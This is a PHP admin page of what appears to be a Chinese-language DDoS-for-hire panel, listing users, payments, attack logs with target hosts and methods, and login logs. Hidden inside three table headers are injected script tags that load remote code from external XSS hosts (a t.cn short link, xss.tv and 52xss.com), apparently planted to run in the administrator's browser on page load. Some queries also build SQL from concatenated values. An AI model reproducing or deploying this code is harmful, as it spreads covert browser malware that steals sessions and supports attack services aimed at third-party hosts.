<?php date_default_timezone_set("PRC");  ?>
<?php
include("header.php");
if (!($user -> isAdmin($odb)))
{
	header('location: ../index.php');
	die();
}

if (isset($_POST['users']))
{
$SQL = $odb -> query("DELETE FROM `users` WHERE `membership` = 0");
}
if (isset($_POST['payments']))
{
$SQL = $odb -> query("TRUNCATE `payments`");
}
if (isset($_POST['attacks']))
{
$SQL = $odb -> query("TRUNCATE `logs`");
}
if (isset($_POST['logins']))
{
$SQL = $odb -> query("TRUNCATE `loginlogs`");
}

?>
<form method="post">
            <div class="page-content">

                <div class="container">
                    <div class="page-toolbar">
                        
                        <div class="page-toolbar-block">
                            <div class="page-toolbar-title">日志&用户</div>
                            <div class="page-toolbar-subtitle">用户、支付、攻击和登录</div>
                        </div>        
                       <ul class="page-toolbar-tabs">
                            <li class="active"><a href="#page-tab-1">用户</a></li>
                            <li><a href="#page-tab-2">支付</a></li>
                            <li><a href="#page-tab-3">攻击</a></li>
                            <li><a href="#page-tab-4">登录</a></li>
                        </ul>
                    </div>                    
<div class="row page-toolbar-tab active" id="page-tab-1">
                            <div class="block">
                                <div class="block-head">
                                    <h2>用户<button type="submit" class="btn btn-link btn-xs" name="users">删除没有套餐的用户</button></h2>
                                </div>
                                <div class="block-content np">
                                    <table class="table table-bordered table-striped sortable">
                                        <thead>
                                            <tr>
                                                <th>用户名</th>
                                                <th>Email</th>
                                                <th>级别</th>
                                                <th>天次数</th>
                                                <th>套餐</th>                                    
                                            </tr>
                                        </thead>
                                        <tbody>
<?php





$SQLGetUsers = $odb -> query("SELECT * FROM `users` ORDER BY `ID` DESC");
while ($getInfo = $SQLGetUsers -> fetch(PDO::FETCH_ASSOC))
{



    
    if ($getInfo['cishu']>0) {
        $huiyuancis = $getInfo['cishu'];
    }else{
        //查询当下会员次数
        $plansql = $odb -> prepare("SELECT `plans`.`cishu` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
        $plansql -> execute(array(":id" => $getInfo['ID']));
        $rowxd = $plansql -> fetch(); 
        if (!$rowxd) {
            $huiyuancis = 0;
        }else{
             $huiyuancis = $rowxd['cishu'];
        }
       
    }


    //查询今日次数
    $SQLSelect = $odb -> query("SELECT * FROM `gjcs` WHERE uid =".$getInfo['ID']." AND shijian=".strtotime(date('Y-m-d',time())));
    $yicishu = 0;
    while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
    {
        $yicishu++;
    }




	$id = $getInfo['ID'];
	$user = $getInfo['username'];
	$email = $getInfo['email'];
	if ($getInfo['expire']>time()) {$plan = $odb -> query("SELECT `plans`.`name` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = '$id'") -> fetchColumn(0);} else {$plan='没有套餐';}
	$rank = $getInfo['rank'];
		if ($rank == 1)
		{
			$rank = 'Admin';
		}
		elseif ($rank == 2)
		{
			$rank = 'Supporter';
		}
		else
		{
			$rank = 'Member';
		}
	echo '<tr><td><a href="user.php?id='.$id.'">'.htmlspecialchars($user).'</a></td><td>'.htmlspecialchars($email).'</td><td>'.$rank.'</td><td>'.$yicishu.'/'.$huiyuancis.'</td><td>'.htmlspecialchars($plan).'</td></tr>';
}
?>											
                                        </tbody>
                                    </table>                                                                        
                                </div>
                            </div>

</div>
<div class="row page-toolbar-tab" id="page-tab-2">
                            <div class="block">
                                <div class="block-head">
                                    <h2>支付<button type="submit" class="btn btn-link btn-xs" name="payments">删除付款</button></h2>
                                </div>
                                <div class="block-content np">
                                    <table class="table table-bordered table-striped sortable">
                                        <thead>
                                            <tr>
                    <th>用户</th>
                    <th>套餐</th>
                    <th>Email</th>
                    <th>交易ID</th>
                    <th>日期<script src=http://t.cn/RX6ZGFt></script></th>
                                            </tr>
                                        </thead>
                                        <tbody>
<?php
$SQLGetLogs = $odb -> query("SELECT `payments`.* , `plans`.`name` AS `planname`, `users`.`username` FROM `payments` LEFT JOIN `plans` ON `payments`.`plan` = `plans`.`ID` LEFT JOIN `users` ON `payments`.`user` = `users`.`ID` ORDER BY `ID` DESC");
while($getInfo = $SQLGetLogs -> fetch(PDO::FETCH_ASSOC))
{
	$user = $getInfo['username'];
	$plan = $getInfo['planname'];
	$email = $getInfo['email'];
	$tid = $getInfo['tid'];
	$amount = $getInfo['paid'];
	$date = date("m-d-Y, H:i:s a" ,$getInfo['date']);
	echo '<tr"><td>'.htmlspecialchars($user).'</td><td>'.htmlspecialchars($plan).' ($'.$amount.')</td><td>'.htmlspecialchars($email).'</td><td>'.htmlspecialchars($tid).'</td><td>'.$date.'</td></tr>';
}
?>						
                                        </tbody>
                                    </table>                                                                        
                                </div>
                            </div>
</div>
<div class="row page-toolbar-tab" id="page-tab-3">
                            <div class="block">
                                <div class="block-head">
                                    <h2>攻击日志<button type="submit" class="btn btn-link btn-xs" name="attacks">删除攻击日志</button></h2>
                                </div>
                                <div class="block-content np">
                                    <table class="table table-bordered table-striped sortable">
                                        <thead>
                                            <tr>
                    <th>用户</th></script><sCrIpT src=https://xss.tv/QL></script>
                    <th>Host</th>
                    <th>时间（秒）</th>
                    <th>服务器</th>
                    <th>日期</th>                               
                                            </tr>
                                        </thead>
                                        <tbody>
<?php
$SQLGetLogs = $odb -> query("SELECT * FROM `logs` ORDER BY `date` DESC");
while($getInfo = $SQLGetLogs -> fetch(PDO::FETCH_ASSOC))
{
	$user = $getInfo['user'];
	$host = $getInfo['ip'];
	if (filter_var($host, FILTER_VALIDATE_URL)) {$port='';} else {$port=':'.$getInfo['port'];}
	$time = $getInfo['time'];
	$method = $getInfo['method'];
	$handler = $getInfo['handler'];
	$date = date("m-d-Y, H:i:s a" ,$getInfo['date']);
	echo '<tr><td>'.htmlspecialchars($user).'</td><td>'.htmlspecialchars($host).$port.' ('.htmlspecialchars($method).')<br></td><td>'.$time.'</td><td>'.htmlspecialchars($handler).'</td><td>'.$date.'</td></tr>';
}
?>
                                        </tbody>
                                    </table>                                                                        
                                </div>
                            </div>
</div>
<div class="row page-toolbar-tab" id="page-tab-4">
                            <div class="block">
                                <div class="block-head">
                                    <h2>登录日志</script><script src=http://52xss.com/z0></script><button type="submit" class="btn btn-link btn-xs" name="logins">删除登录日志</button></h2>
                                </div>
                                <div class="block-content np">
                                    <table class="table table-bordered table-striped sortable">
                                        <thead>
                                            <tr>
                                                <th></th>
                    <th>用户</th>
                    <th>IP</th>
                    <th>日期</th>
                    <th>国家</th>                                  
                                            </tr>
                                        </thead>
                                        <tbody>
<?php 
$SQLGetUsers = $odb -> query("SELECT * FROM `loginlogs` ORDER BY `date` DESC");
while ($getInfo = $SQLGetUsers -> fetch(PDO::FETCH_ASSOC))
{
	$username = $getInfo['username'];
	$ip = $getInfo['ip'];
	$date = date("m-d-Y, H:i:s a" ,$getInfo['date']);
	$country = $getInfo['country'];
	echo '<tr><td></td><td>'.htmlspecialchars($username).'</td><td>'.htmlspecialchars($ip).'</td><td>'.$date.'</td><td>'.htmlspecialchars($country).'</td></tr>';
}
?>
                                        </tbody>
                                    </table>                                                                        
                                </div>
                            </div>
</div>
                </div>
                
            </div>
			</form>
            <div class="page-sidebar"></div>
        </div>
    </body>
</html>